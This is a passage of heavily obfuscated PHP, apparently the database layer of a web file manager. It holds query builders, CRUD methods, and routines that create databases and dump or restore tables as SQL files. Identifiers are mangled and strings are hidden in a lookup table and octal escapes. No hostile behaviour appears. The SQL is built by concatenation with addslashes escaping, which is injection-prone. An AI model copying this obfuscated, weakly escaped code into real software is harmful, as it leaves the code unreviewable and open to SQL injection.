(preg_match($ùñƒ»ô¬[1040], $ÖÔïÓ¶[0])) { if (is_array($ÖÔïÓ¶[1])) { $âÅà”¶ = isset($ÖÔïÓ¶[2]) ? strtoupper($ÖÔïÓ¶[2]) : $ùñƒ»ô¬[1025]; if (in_array($âÅà”¶, array($ùñƒ»ô¬[1024], $ùñƒ»ô¬[1025], $ùñƒ»ô¬[1026]))) { $â¢×¾§¹ = array(); foreach ($ÖÔïÓ¶[1] as $¢±ì»ûÍ) { $â¢×¾§¹[] = $é¨“ªÄˆ . $ùñƒ»ô¬[53] . $this->exp[$£¬§ïŞò] . $ùñƒ»ô¬[53] . $this->parseValue($¢±ì»ûÍ); } $äôøŠ˜Ô .= $ùñƒ»ô¬[260] . implode($ùñƒ»ô¬[53] . $âÅà”¶ . $ùñƒ»ô¬[53], $â¢×¾§¹) . $ùñƒ»ô¬[925]; } } else { $äôøŠ˜Ô .= $é¨“ªÄˆ . $ùñƒ»ô¬[53] . $this->exp[$£¬§ïŞò] . $ùñƒ»ô¬[53] . $this->parseValue($ÖÔïÓ¶[1]); } } elseif ($ùñƒ»ô¬[297] == $£¬§ïŞò) { $äôøŠ˜Ô .= $ùñƒ»ô¬[923] . $é¨“ªÄˆ . $ùñƒ»ô¬[53] . $ÖÔïÓ¶[1] . $ùñƒ»ô¬[1041]; } elseif (preg_match($ùñƒ»ô¬[1042], $ÖÔïÓ¶[0])) { $äôøŠ˜Ô .= $ÖÔïÓ¶[0]; } elseif (preg_match($ùñƒ»ô¬[1043], $ÖÔïÓ¶[0])) { if (isset($ÖÔïÓ¶[2]) && $ùñƒ»ô¬[297] == $ÖÔïÓ¶[2]) { $äôøŠ˜Ô .= $é¨“ªÄˆ . $ùñƒ»ô¬[53] . $this->exp[$£¬§ïŞò] . $ùñƒ»ô¬[53] . $ÖÔïÓ¶[1]; } else { if (is_string($ÖÔïÓ¶[1])) { $ÖÔïÓ¶[1] = explode($ùñƒ»ô¬[50], $ÖÔïÓ¶[1]); } $ÁÅÆºŠÇ = implode($ùñƒ»ô¬[50], $this->parseValue($ÖÔïÓ¶[1])); $äôøŠ˜Ô .= $é¨“ªÄˆ . $ùñƒ»ô¬[53] . $this->exp[$£¬§ïŞò] . $ùñƒ»ô¬[923] . $ÁÅÆºŠÇ . $ùñƒ»ô¬[925]; } } elseif (preg_match($ùñƒ»ô¬[1044], $ÖÔïÓ¶[0])) { $¤„ä¯ğ­ = is_string($ÖÔïÓ¶[1]) ? explode($ùñƒ»ô¬[50], $ÖÔïÓ¶[1]) : $ÖÔïÓ¶[1]; $äôøŠ˜Ô .= $ùñƒ»ô¬[923] . $é¨“ªÄˆ . $ùñƒ»ô¬[53] . $this->exp[$£¬§ïŞò] . $ùñƒ»ô¬[53] . $this->parseValue($¤„ä¯ğ­[0]) . $ùñƒ»ô¬[1027] . $this->parseValue($¤„ä¯ğ­[1]) . $ùñƒ»ô¬[278]; } else { think_exception(think_lang($ùñƒ»ô¬[1030]) . $ùñƒ»ô¬[4] . $ÖÔïÓ¶[0]); } } else { $ĞˆŞ÷¦¹ = count($ÖÔïÓ¶); $ò—ì‡³¾ = $ùñƒ»ô¬[12]; if (is_string($ÖÔïÓ¶[$ĞˆŞ÷¦¹ - 1])) { $ò—ì‡³¾ = isset($ÖÔïÓ¶[$ĞˆŞ÷¦¹ - 1]) ? strtoupper($ÖÔïÓ¶[$ĞˆŞ÷¦¹ - 1]) : $ùñƒ»ô¬[12]; if (in_array($ò—ì‡³¾, array($ùñƒ»ô¬[1024], $ùñƒ»ô¬[1025], $ùñƒ»ô¬[1026]))) { $ĞˆŞ÷¦¹ = $ĞˆŞ÷¦¹ - 1; } } else { $ò—ì‡³¾ = $ùñƒ»ô¬[1024]; } for ($İÌ£¿»Ò = 0; $İÌ£¿»Ò < $ĞˆŞ÷¦¹; $İÌ£¿»Ò++) { $¤„ä¯ğ­ = is_array($ÖÔïÓ¶[$İÌ£¿»Ò]) ? $ÖÔïÓ¶[$İÌ£¿»Ò][1] : $ÖÔïÓ¶[$İÌ£¿»Ò]; if ($ùñƒ»ô¬[297] == strtolower($ÖÔïÓ¶[$İÌ£¿»Ò][0])) { $äôøŠ˜Ô .= $ùñƒ»ô¬[260] . $é¨“ªÄˆ . $ùñƒ»ô¬[53] . $¤„ä¯ğ­ . $ùñƒ»ô¬[1041] . $ò—ì‡³¾ . $ùñƒ»ô¬[53]; } else { $õ¾ç‚­… = is_array($ÖÔïÓ¶[$İÌ£¿»Ò]) ? $this->exp[strtolower($ÖÔïÓ¶[$İÌ£¿»Ò][0])] : $ùñƒ»ô¬[904]; if (!$õ¾ç‚­… && is_array($ÖÔïÓ¶[$İÌ£¿»Ò]) && in_array($ÖÔïÓ¶[$İÌ£¿»Ò][0], array($ùñƒ»ô¬[904], $ùñƒ»ô¬[1034], $ùñƒ»ô¬[1035], $ùñƒ»ô¬[1036], $ùñƒ»ô¬[1037], $ùñƒ»ô¬[1038]))) { $õ¾ç‚­… = $ÖÔïÓ¶[$İÌ£¿»Ò][0]; } $äôøŠ˜Ô .= $ùñƒ»ô¬[260] . $é¨“ªÄˆ . $ùñƒ»ô¬[53] . $õ¾ç‚­… . $ùñƒ»ô¬[53] . $this->parseValue($¤„ä¯ğ­) . $ùñƒ»ô¬[1041] . $ò—ì‡³¾ . $ùñƒ»ô¬[53]; } } $äôøŠ˜Ô = substr($äôøŠ˜Ô, 0, -4); } } else { $äôøŠ˜Ô .= $é¨“ªÄˆ . $ùñƒ»ô¬[1045] . $this->parseValue($ÖÔïÓ¶); } return $äôøŠ˜Ô; } protected function parseThinkWhere($Š¿³•¨Ô, $˜çÎò°—) { $äÒ°ÁíÊ =& $_SERVER[³·—™¤¢]; $ŒÚÏÌíÒ = $äÒ°ÁíÊ[12]; switch ($Š¿³•¨Ô) { case $äÒ°ÁíÊ[352]: $ŒÚÏÌíÒ = $˜çÎò°—; break; case $äÒ°ÁíÊ[1028]: $ŒÚÏÌíÒ = is_string($˜çÎò°—) ? $˜çÎò°— : substr($this->parseWhere($˜çÎò°—), 6); break; case $äÒ°ÁíÊ[1046]: parse_str($˜çÎò°—, $şä¼¡); if (isset($şä¼¡[$äÒ°ÁíÊ[1023]])) { $ÉÒùÉŸÙ = $äÒ°ÁíÊ[53] . strtoupper($şä¼¡[$äÒ°ÁíÊ[1023]]) . $äÒ°ÁíÊ[53]; unset($şä¼¡[$äÒ°ÁíÊ[1023]]); } else { $ÉÒùÉŸÙ = $äÒ°ÁíÊ[1027]; } $ª¨±‡…° = array(); foreach ($şä¼¡ as $Ë†ÉıŠ => $ˆ¸‡ïŸß) { $ª¨±‡…°[] = $this->parseKey($Ë†ÉıŠ) . $äÒ°ÁíÊ[1045] . $this->parseValue($ˆ¸‡ïŸß); } $ŒÚÏÌíÒ = implode($ÉÒùÉŸÙ, $ª¨±‡…°); break; } return $ŒÚÏÌíÒ; } protected function parseLimit($ã¦îßÀÔ) { $Ñèİö¾± =& $_SERVER[³·—™¤¢]; return !empty($ã¦îßÀÔ) ? $Ñèİö¾±[51] . $ã¦îßÀÔ . $Ñèİö¾±[53] : $Ñèİö¾±[12]; } protected function parseJoin($‡ŸÂ—»Ã) { $ÇÄ„“—Ö =& $_SERVER[³·—™¤¢]; $šô¦Ê×À = $ÇÄ„“—Ö[12]; if (!empty($‡ŸÂ—»Ã)) { if (is_array($‡ŸÂ—»Ã)) { foreach ($‡ŸÂ—»Ã as $ÜÆ‰†Íö => $‡ì®Î–) { if (!1 !== stripos($‡ì®Î–, $ÇÄ„“—Ö[1047])) { $šô¦Ê×À .= $ÇÄ„“—Ö[53] . $‡ì®Î–; } else { $šô¦Ê×À .= $ÇÄ„“—Ö[1048] . $‡ì®Î–; } } } else { $šô¦Ê×À .= $ÇÄ„“—Ö[1048] . $‡ŸÂ—»Ã; } } $šô¦Ê×À = preg_replace($ÇÄ„“—Ö[1049], think_config($ÇÄ„“—Ö[952]) . $ÇÄ„“—Ö[1050], $šô¦Ê×À); return $šô¦Ê×À; } protected function parseOrder($±âÔ×º) { $¡‡²çñË =& $_SERVER[³·—™¤¢]; if (is_array($±âÔ×º)) { $ó§“ÕÃÒ = array(); foreach ($±âÔ×º as $ƒ÷Á¼Ÿè => $£Ä¼µû—) { if (is_numeric($ƒ÷Á¼Ÿè)) { $ó§“ÕÃÒ[] = $this->parseKey($£Ä¼µû—); } else { $£Ä¼µû— = in_array(strtoupper(trim($£Ä¼µû—)), array($¡‡²çñË[1051], $¡‡²çñË[1052])) ? $¡‡²çñË[53] . $£Ä¼µû— : $¡‡²çñË[12]; if (preg_match($¡‡²çñË[1053], $ƒ÷Á¼Ÿè)) { $ó§“ÕÃÒ[] = $this->parseKey($ƒ÷Á¼Ÿè) . $£Ä¼µû—; } else { think_exception($¡‡²çñË[1054] . $ƒ÷Á¼Ÿè); } } } $±âÔ×º = implode($¡‡²çñË[50], $ó§“ÕÃÒ); } return !empty($±âÔ×º) ? $¡‡²çñË[1055] . $±âÔ×º : $¡‡²çñË[12]; } protected function parseGroup($ñëû½æ±) { $¯ö²£É¸ =& $_SERVER[³·—™¤¢]; return !empty($ñëû½æ±) ? $¯ö²£É¸[1056] . $ñëû½æ± : $¯ö²£É¸[12]; } protected function parseHaving($Ÿ¬«ôÎ) { $¦Ï©»É =& $_SERVER[³·—™¤¢]; return !empty($Ÿ¬«ôÎ) ? $¦Ï©»É[1057] . $Ÿ¬«ôÎ : $¦Ï©»É[12]; } protected function parseComment($œùÛŞŒ ) { $¦ËŠ =& $_SERVER[³·—™¤¢]; return !empty($œùÛŞŒ ) ? $¦ËŠ[1058] . $œùÛŞŒ  . $¦ËŠ[1059] : $¦ËŠ[12]; } protected function parseDistinct($‰Ê§¼Ûé) { $õÓ­¹¤ =& $_SERVER[³·—™¤¢]; return !empty($‰Ê§¼Ûé) ? $õÓ­¹¤[1060] : $õÓ­¹¤[12]; } protected function parseUnion($õô³§±) { $ª±°³çª =& $_SERVER[³·—™¤¢]; if (empty($õô³§±)) { return $ª±°³çª[12]; } if (isset($õô³§±[$ª±°³çª[348]])) { $´ÂóûæÒ = $ª±°³çª[1061]; unset($õô³§±[$ª±°³çª[348]]); } else { $´ÂóûæÒ = $ª±°³çª[1062]; } foreach ($õô³§± as $Äï¬ØåÜ) { $ˆ®’¯—[] = $´ÂóûæÒ . (is_array($Äï¬ØåÜ) ? $this->buildSelectSql($Äï¬ØåÜ) : $Äï¬ØåÜ); } return implode($ª±°³çª[53], $ˆ®’¯—); } public function insert($‘‰à¹×“, $ëğÇÖäº = array(), $¸ûãªä = false) { $Ã˜ïƒÙ³ =& $_SERVER[³·—™¤¢]; $÷ƒ·¸Ø = $ÀÆ™»°¦ = array(); $this->model = $ëğÇÖäº[$Ã˜ïƒÙ³[281]]; foreach ($‘‰à¹×“ as $é‚•¤Ø¤ => $óÚ°³…ú) { if (is_array($óÚ°³…ú) && $Ã˜ïƒÙ³[297] == $óÚ°³…ú[0]) { $ÀÆ™»°¦[] = $this->parseKey($é‚•¤Ø¤); $÷ƒ·¸Ø[] = $óÚ°³…ú[1]; } elseif (is_scalar($óÚ°³…ú) || is_null($óÚ°³…ú)) { $ÀÆ™»°¦[] = $this->parseKey($é‚•¤Ø¤); $÷ƒ·¸Ø[] = $this->parseValue($óÚ°³…ú); } } $««áì¡Ø = ($¸ûãªä ? $Ã˜ïƒÙ³[927] : $Ã˜ïƒÙ³[928]) . $Ã˜ïƒÙ³[929] . $this->parseTable($ëğÇÖäº[$Ã˜ïƒÙ³[279]]) . $Ã˜ïƒÙ³[923] . implode($Ã˜ïƒÙ³[50], $ÀÆ™»°¦) . $Ã˜ïƒÙ³[924] . implode($Ã˜ïƒÙ³[50], $÷ƒ·¸Ø) . $Ã˜ïƒÙ³[925]; $««áì¡Ø .= $this->parseLock(isset($ëğÇÖäº[$Ã˜ïƒÙ³[863]]) ? $ëğÇÖäº[$Ã˜ïƒÙ³[863]] : !1); $««áì¡Ø .= $this->parseComment(!empty($ëğÇÖäº[$Ã˜ïƒÙ³[354]]) ? $ëğÇÖäº[$Ã˜ïƒÙ³[354]] : $Ã˜ïƒÙ³[12]); return $this->execute($««áì¡Ø, $this->parseBind(!empty($ëğÇÖäº[$Ã˜ïƒÙ³[285]]) ? $ëğÇÖäº[$Ã˜ïƒÙ³[285]] : array())); } public function selectInsert($æïôõË¦, $éç€Éš, $ä×¬ß½õ = array()) { $ŞÈëÑâ =& $_SERVER[³·—™¤¢]; $this->model = $ä×¬ß½õ[$ŞÈëÑâ[281]]; if (is_string($æïôõË¦)) { $æïôõË¦ = explode($ŞÈëÑâ[50], $æïôõË¦); } array_walk($æïôõË¦, array($this, $ŞÈëÑâ[926])); $Ë’ÛÖğñ = $ŞÈëÑâ[1063] . $this->parseTable($éç€Éš) . $ŞÈëÑâ[923] . implode($ŞÈëÑâ[50], $æïôõË¦) . $ŞÈëÑâ[1041]; $Ë’ÛÖğñ .= $this->buildSelectSql($ä×¬ß½õ); return $this->execute($Ë’ÛÖğñ, $this->parseBind(!empty($ä×¬ß½õ[$ŞÈëÑâ[285]]) ? $ä×¬ß½õ[$ŞÈëÑâ[285]] : array())); } public function update($‰®Íè…, $şÔğšÆ) { $§ÛŒ‹Ì¦ =& $_SERVER[³·—™¤¢]; $this->model = $şÔğšÆ[$§ÛŒ‹Ì¦[281]]; $³ÛóõÉ = $§ÛŒ‹Ì¦[1064] . $this->parseTable($şÔğšÆ[$§ÛŒ‹Ì¦[279]]) . $this->parseSet($‰®Íè…) . $this->parseWhere(!empty($şÔğšÆ[$§ÛŒ‹Ì¦[275]]) ? $şÔğšÆ[$§ÛŒ‹Ì¦[275]] : $§ÛŒ‹Ì¦[12]) . $this->parseOrder(!empty($şÔğšÆ[$§ÛŒ‹Ì¦[365]]) ? $şÔğšÆ[$§ÛŒ‹Ì¦[365]] : $§ÛŒ‹Ì¦[12]) . $this->parseLimit(!empty($şÔğšÆ[$§ÛŒ‹Ì¦[292]]) ? $şÔğšÆ[$§ÛŒ‹Ì¦[292]] : $§ÛŒ‹Ì¦[12]) . $this->parseLock(isset($şÔğšÆ[$§ÛŒ‹Ì¦[863]]) ? $şÔğšÆ[$§ÛŒ‹Ì¦[863]] : !1) . $this->parseComment(!empty($şÔğšÆ[$§ÛŒ‹Ì¦[354]]) ? $şÔğšÆ[$§ÛŒ‹Ì¦[354]] : $§ÛŒ‹Ì¦[12]); return $this->execute($³ÛóõÉ, $this->parseBind(!empty($şÔğšÆ[$§ÛŒ‹Ì¦[285]]) ? $şÔğšÆ[$§ÛŒ‹Ì¦[285]] : array())); } public function delete($Œ®Œ‡º¬ = array()) { $ëÈïÊ×Ü =& $_SERVER[³·—™¤¢]; $this->model = $Œ®Œ‡º¬[$ëÈïÊ×Ü[281]]; $ã­êÛà = $ëÈïÊ×Ü[1065] . $this->parseTable($Œ®Œ‡º¬[$ëÈïÊ×Ü[279]]) . $this->parseWhere(!empty($Œ®Œ‡º¬[$ëÈïÊ×Ü[275]]) ? $Œ®Œ‡º¬[$ëÈïÊ×Ü[275]] : $ëÈïÊ×Ü[12]) . $this->parseOrder(!empty($Œ®Œ‡º¬[$ëÈïÊ×Ü[365]]) ? $Œ®Œ‡º¬[$ëÈïÊ×Ü[365]] : $ëÈïÊ×Ü[12]) . $this->parseLimit(!empty($Œ®Œ‡º¬[$ëÈïÊ×Ü[292]]) ? $Œ®Œ‡º¬[$ëÈïÊ×Ü[292]] : $ëÈïÊ×Ü[12]) . $this->parseLock(isset($Œ®Œ‡º¬[$ëÈïÊ×Ü[863]]) ? $Œ®Œ‡º¬[$ëÈïÊ×Ü[863]] : !1) . $this->parseComment(!empty($Œ®Œ‡º¬[$ëÈïÊ×Ü[354]]) ? $Œ®Œ‡º¬[$ëÈïÊ×Ü[354]] : $ëÈïÊ×Ü[12]); return $this->execute($ã­êÛà, $this->parseBind(!empty($Œ®Œ‡º¬[$ëÈïÊ×Ü[285]]) ? $Œ®Œ‡º¬[$ëÈïÊ×Ü[285]] : array())); } public function select($¤™®îçÇ = array()) { $ß²òÚüœ =& $_SERVER[³·—™¤¢]; $this->model = $¤™®îçÇ[$ß²òÚüœ[281]]; $ìáµîã‚ = $this->buildSelectSql($¤™®îçÇ); $–®ä¨¼ = isset($¤™®îçÇ[$ß²òÚüœ[349]]) ? $¤™®îçÇ[$ß²òÚüœ[349]] : !1; if ($–®ä¨¼) { $ü…†€ø = is_string($–®ä¨¼[$ß²òÚüœ[94]]) ? $–®ä¨¼[$ß²òÚüœ[94]] : $ß²òÚüœ[1066] . md5($ìáµîã‚); $áû•³ùÓ = think_cache($ü…†€ø, $ß²òÚüœ[12], $–®ä¨¼); if (!1 !== $áû•³ùÓ) { return $áû•³ùÓ; } } $¹€õÌóÄ = $this->query($ìáµîã‚, $this->parseBind(!empty($¤™®îçÇ[$ß²òÚüœ[285]]) ? $¤™®îçÇ[$ß²òÚüœ[285]] : array())); if ($–®ä¨¼ && !1 !== $¹€õÌóÄ) { think_cache($ü…†€ø, $¹€õÌóÄ, $–®ä¨¼); } return $¹€õÌóÄ; } public function buildSelectSql($şš–Ø½à = array()) { $òåáÆ¾ê =& $_SERVER[³·—™¤¢]; if (isset($şš–Ø½à[$òåáÆ¾ê[353]])) { if (strpos($şš–Ø½à[$òåáÆ¾ê[353]], $òåáÆ¾ê[50])) { list($Šß¾ÓÂ¿, $†’Ø¯Í) = explode($òåáÆ¾ê[50], $şš–Ø½à[$òåáÆ¾ê[353]]); } else { $Šß¾ÓÂ¿ = $şš–Ø½à[$òåáÆ¾ê[353]]; } $Šß¾ÓÂ¿ = $Šß¾ÓÂ¿ ? $Šß¾ÓÂ¿ : 1; $†’Ø¯Í = isset($†’Ø¯Í) ? $†’Ø¯Í : (is_numeric($şš–Ø½à[$òåáÆ¾ê[292]]) ? $şš–Ø½à[$òåáÆ¾ê[292]] : 20); $ÀÌÌŠÀş = $†’Ø¯Í * ((int) $Šß¾ÓÂ¿ - 1); $şš–Ø½à[$òåáÆ¾ê[292]] = $ÀÌÌŠÀş . $òåáÆ¾ê[50] . $†’Ø¯Í; } if (think_config($òåáÆ¾ê[1067])) { $³å‘â = $òåáÆ¾ê[1068] . md5(serialize($şš–Ø½à)); $–ÑÈÖş = think_cache($³å‘â); if ($–ÑÈÖş) { return $–ÑÈÖş; } } $‘‹ô‹Ô = $this->parseSql($this->selectSql, $şš–Ø½à); $‘‹ô‹Ô .= $this->parseLock(isset($şš–Ø½à[$òåáÆ¾ê[863]]) ? $şš–Ø½à[$òåáÆ¾ê[863]] : !1); if (isset($³å‘â)) { think_cache($³å‘â, $‘‹ô‹Ô); } return $‘‹ô‹Ô; } public function parseSql($ÕÊ³ÉÌ¯, $³”À‹©£ = array()) { $Îòï±¼ =& $_SERVER[³·—™¤¢]; $ÕÊ³ÉÌ¯ = str_replace(array($Îòï±¼[1069], $Îòï±¼[1070], $Îòï±¼[1071], $Îòï±¼[1072], $Îòï±¼[1073], $Îòï±¼[1074], $Îòï±¼[1075], $Îòï±¼[1076], $Îòï±¼[1077], $Îòï±¼[1078], $Îòï±¼[1079]), array($this->parseTable("{$³”À‹©£[$Îòï±¼[279]]}"), $this->parseDistinct(isset($³”À‹©£[$Îòï±¼[1080]]) ? $³”À‹©£[$Îòï±¼[1080]] : !1), $this->parseField(!empty($³”À‹©£[$Îòï±¼[273]]) ? $³”À‹©£[$Îòï±¼[273]] : $Îòï±¼[188]), $this->parseJoin(!empty($³”À‹©£[$Îòï±¼[282]]) ? $³”À‹©£[$Îòï±¼[282]] : $Îòï±¼[12]), $this->parseWhere(!empty($³”À‹©£[$Îòï±¼[275]]) ? $³”À‹©£[$Îòï±¼[275]] : $Îòï±¼[12]), $this->parseGroup(!empty($³”À‹©£[$Îòï±¼[515]]) ? $³”À‹©£[$Îòï±¼[515]] : $Îòï±¼[12]), $this->parseHaving(!empty($³”À‹©£[$Îòï±¼[1081]]) ? $³”À‹©£[$Îòï±¼[1081]] : $Îòï±¼[12]), $this->parseOrder(!empty($³”À‹©£[$Îòï±¼[365]]) ? $³”À‹©£[$Îòï±¼[365]] : $Îòï±¼[12]), $this->parseLimit(!empty($³”À‹©£[$Îòï±¼[292]]) ? $³”À‹©£[$Îòï±¼[292]] : $Îòï±¼[12]), $this->parseUnion(!empty($³”À‹©£[$Îòï±¼[347]]) ? $³”À‹©£[$Îòï±¼[347]] : $Îòï±¼[12]), $this->parseComment(!empty($³”À‹©£[$Îòï±¼[354]]) ? $³”À‹©£[$Îòï±¼[354]] : $Îòï±¼[12])), $ÕÊ³ÉÌ¯); return $ÕÊ³ÉÌ¯; } public function getLastSql($Åğé¬± = '') { return $Åğé¬± ? $this->modelSql[$Åğé¬±] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¹Ø´ò) { return addslashes($¹Ø´ò); } public function setModel($°”¯İ¶™) { $this->model = $°”¯İ¶™; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($œ³íŠóÜ = array()) { $¯ß¨³¡¸ =& $_SERVER[³·—™¤¢]; if (empty($œ³íŠóÜ)) { $œ³íŠóÜ = $GLOBALS[$¯ß¨³¡¸[6]][$¯ß¨³¡¸[21]]; } $this->database = $œ³íŠóÜ; } public function model($¼èœÃ¦¥ = '') { return new ModelBase($¼èœÃ¦¥, $_SERVER[³·—™¤¢][12], $this->database); } public function db($ßÁ‹Âñ = false) { $×ÑŸÅ§É =& $_SERVER[³·—™¤¢]; $ı™¦öµ­ = array_change_key_case($this->database); if ($this->dbType() == $×ÑŸÅ§É[13] || !$ßÁ‹Âñ) { return $this->model()->db(); } $ûºÎ¿Íƒ = $ı™¦öµ­[$×ÑŸÅ§É[995]]; $ı™¦öµ­[$×ÑŸÅ§É[995]] = $×ÑŸÅ§É[12]; if ($ı™¦öµ­[$×ÑŸÅ§É[990]] == $×ÑŸÅ§É[987]) { $•ô©¨üú = $ı™¦öµ­[$×ÑŸÅ§É[996]]; $ı™¦öµ­[$×ÑŸÅ§É[996]] = substr($•ô©¨üú, 0, strrpos($•ô©¨üú, $×ÑŸÅ§É[1082])); } $this->database = $ı™¦öµ­; $ÂâÈ–… = $this->model()->db(); try { $­Ô±®¥ = $ÂâÈ–…->execute("\163\150\x6f\x77\40\144\x61\x74\x61\x62\141\163\x65\x73\40\154\151\x6b\x65\40\47{$ûºÎ¿Íƒ}\47"); } catch (Exception $ï¿°Ç™ç) { } if (!$­Ô±®¥) { $ÂâÈ–…->execute("\143\162\x65\x61\x74\x65\x20\x64\x61\164\x61\142\141\x73\145\x20\140{$ûºÎ¿Íƒ}\140"); } $ı™¦öµ­[$×ÑŸÅ§É[995]] = $ûºÎ¿Íƒ; if ($ı™¦öµ­[$×ÑŸÅ§É[990]] == $×ÑŸÅ§É[987]) { $ı™¦öµ­[$×ÑŸÅ§É[996]] .= $×ÑŸÅ§É[1082] . $ûºÎ¿Íƒ; } $this->database = $ı™¦öµ­; $ÂâÈ–…->execute("\165\163\145\40\140{$ûºÎ¿Íƒ}\140"); return $ÂâÈ–…; } public function createTable($­…Ç³ç, &$Î†ô˜Â­) { $Á‡İõˆá =& $_SERVER[³·—™¤¢]; if (!IO::exist($­…Ç³ç)) { ActionCall($Á‡İõˆá[1083], !0, 0); show_json(LNG($Á‡İõˆá[1084]), !1); } $¬‹åÚñÓ = $this->model()->db(); $”ô”À•Š = sqlSplit(IO::getContent($­…Ç³ç)); foreach ($”ô”À•Š as $Øˆ™…å) { $§¸¦‰§ = stripos($Øˆ™…å, $Á‡İõˆá[1085]) === 0; if ($§¸¦‰§) { $Î†ô˜Â­->task[$Á‡İõˆá[806]] += 1; } $¬‹åÚñÓ->execute($Øˆ™…å); if ($§¸¦‰§) { preg_match($Á‡İõˆá[1086], $Øˆ™…å, $ÎÎ¢¯ª); $Î†ô˜Â­->task[$Á‡İõˆá[1087]] = $ÎÎ¢¯ª[1]; $Î†ô˜Â­->update(1); } } } public function insertTable($½šÊÆ¨­, &$î±óı˜) { $¸æÂ’™× =& $_SERVER[³·—™¤¢]; $êêõÃñ— = $this->model()->db(); $—Ì¨«ÚÃ = $ı¡¬Ã¹ ? array($ı¡¬Ã¹) : $êêõÃñ—->getTables(); foreach ($½šÊÆ¨­ as $±Ô¥èÃ) { $ı¡¬Ã¹ = basename($±Ô¥èÃ, $¸æÂ’™×[808]); if (!in_array($ı¡¬Ã¹, $—Ì¨«ÚÃ)) { continue; } $î±óı˜->task[$¸æÂ’™×[1087]] = $ı¡¬Ã¹; if (get_filesize($±Ô¥èÃ) == 0) { continue; } $Â‚¶ˆÖ† = $this->sqlToDb($±Ô¥èÃ, $î±óı˜); if (!$Â‚¶ˆÖ†) { ActionCall($¸æÂ’™×[1083], !0, 0); show_json(LNG($¸æÂ’™×[1088]) . "\133{$ı¡¬Ã¹}\135", !1); } } } public function sqlFromDb($î¨íšØ, $¿ˆŞÀåÕ, &$– ÂõÁâ, $™°ßö = '') { if ($– ÂõÁâ) { $– ÂõÁâ->task[$_SERVER[³·—™¤¢][1087]] = $î¨íšØ; } $î³¶›ƒ = $this->model($î¨íšØ); $Å½‹Ï = 0; $†Şö‚ıá = 0; $Âá„£°ë = 10000; $µ¡áÏ¿® = fopen($¿ˆŞÀåÕ, $_SERVER[³·—™¤¢][1089]); $ù´§Ô½ = $î³¶›ƒ->getPk(); $Ä¹ô…ÌĞ = $î³¶›ƒ->getDbFields(); $âÏêğ·Ò = $_SERVER[³·—™¤¢][12]; if ($GLOBALS[$_SERVER[³·—™¤¢][807]] && in_array($î¨íšØ, array($_SERVER[³·—™¤¢][1090], $_SERVER[³·—™¤¢][1091]))) { $âÏêğ·Ò = $î¨íšØ; } do { $Ãá˜ÕÅ = array($ù´§Ô½ => array($_SERVER[³·—™¤¢][1037], $†Şö‚ıá)); $‹šÒØû‹ = $î³¶›ƒ->where($Ãá˜ÕÅ)->field($Ä¹ô…ÌĞ)->order($ù´§Ô½ . $_SERVER[³·—™¤¢][1092])->limit($Âá„£°ë)->select(); $‹šÒØû‹ = !empty($‹šÒØû‹) ? $‹šÒØû‹ : array(); if (!($¨âÁƒ€Ã = count($‹šÒØû‹))) { break; } $Õ©™ì§ö = end($‹šÒØû‹); $†Şö‚ıá = $Õ©™ì§ö[$ù´§Ô½]; $’¶ÆîÏú = array(); foreach ($‹šÒØû‹ as $ŠûÜ‰¶Ü) { if ($âÏêğ·Ò) { if ($î¨íšØ == $_SERVER[³·—™¤¢][1090]) { if ($ŠûÜ‰¶Ü[$_SERVER[³·—™¤¢][33]] == $_SERVER[³·—™¤¢][1093]) { $ºŠ§àÆ‹ = json_decode($ŠûÜ‰¶Ü[$_SERVER[³·—™¤¢][374]], !0); if ($ºŠ§àÆ‹[$_SERVER[³·—™¤¢][32]] == $GLOBALS[$_SERVER[³·—™¤¢][807]] && $ºŠ§àÆ‹[$_SERVER[³·—™¤¢][770]] != 1) { continue; } } } else { if ($ŠûÜ‰¶Ü[$_SERVER[³·—™¤¢][33]] == $_SERVER[³·—™¤¢][1094] && $ŠûÜ‰¶Ü[$_SERVER[³·—™¤¢][94]] == $_SERVER[³·—™¤¢][799]) { continue; } } } if ($™°ßö) { $ŠûÜ‰¶Ü[$_SERVER[³·—™¤¢][84]] = "\x7b\151\157\72{$™°ßö}\x7d" . substr($ŠûÜ‰¶Ü[$_SERVER[³·—™¤¢][84]], strlen("\x7b\x69\157\x3a{$ŠûÜ‰¶Ü[$_SERVER[³·—™¤¢][837]]}\175")); $ŠûÜ‰¶Ü[$_SERVER[³·—™¤¢][837]] = $™°ßö; } $’¶ÆîÏú[] = $_SERVER[³·—™¤¢][1095] . $this->sqlEncode($ŠûÜ‰¶Ü) . $_SERVER[³·—™¤¢][1096]; } $ÁÊÅ¤¿İ = "\x49\116\123\x45\x52\124\x20\111\x4e\124\117\x20\x60{$î¨íšØ}\140\x20\x28\140" . implode($_SERVER[³·—™¤¢][1097], $Ä¹ô…ÌĞ) . $_SERVER[³·—™¤¢][1098]; fwrite($µ¡áÏ¿®, $ÁÊÅ¤¿İ . implode($_SERVER[³·—™¤¢][1099], $’¶ÆîÏú) . $_SERVER[³·—™¤¢][71] . PHP_EOL); $Å½‹Ï += $¨âÁƒ€Ã; if ($– ÂõÁâ) { $– ÂõÁâ->update($¨âÁƒ€Ã); } } while ($Âá„£°ë == $¨âÁƒ€Ã); fclose($µ¡áÏ¿®); return $Å½‹Ï; } public function sqlToDb($¤‰Ç™Ã—, &$¦­¾°èø) { $•’ÓÃ¾À =& $_SERVER[³·—™¤¢]; $Ş””¨÷ø = $this->model()->db(); $—€¼Ùı = @fopen($¤‰Ç™Ã—, $•’ÓÃ¾À[1100]); if (!$—€¼Ùı) { return !1; } $ÎåÊãô = 0; $—Ê§’Š­ = $•’ÓÃ¾À[12]; $ôÊƒŞ‰Ø = array(); $î¶çªÔ« = $this->dbType(); $™Š—²ğí = $î¶çªÔ« == $•’ÓÃ¾À[13] ? 500 : 2000; $ù°•¤úÈ = basename($¤‰Ç™Ã—, $•’ÓÃ¾À[808]); $ìÍõ—á = 0; $šáØóíß = 4194304 - 104858; $°ı”éù = 1000000 - 104858; while (!feof($—€¼Ùı)) { $û ™ğ“Î = trim(fgets($—€¼Ùı)); if (!$û ™ğ“Î) { continue; } $ª½îäù… = $this->sqlDecode($û ™ğ“Î, $î¶çªÔ«, $ù°•¤úÈ); if (stripos($ª½îäù…, $•’ÓÃ¾À[355]) === 0) { if (!$—Ê§’Š­) { $—Ê§’Š­ = $ª½îäù… . $•’ÓÃ¾À[53]; } continue; } if ($¦­¾°èø) { $¦­¾°èø->task[$•’ÓÃ¾À[806]] += 1; } 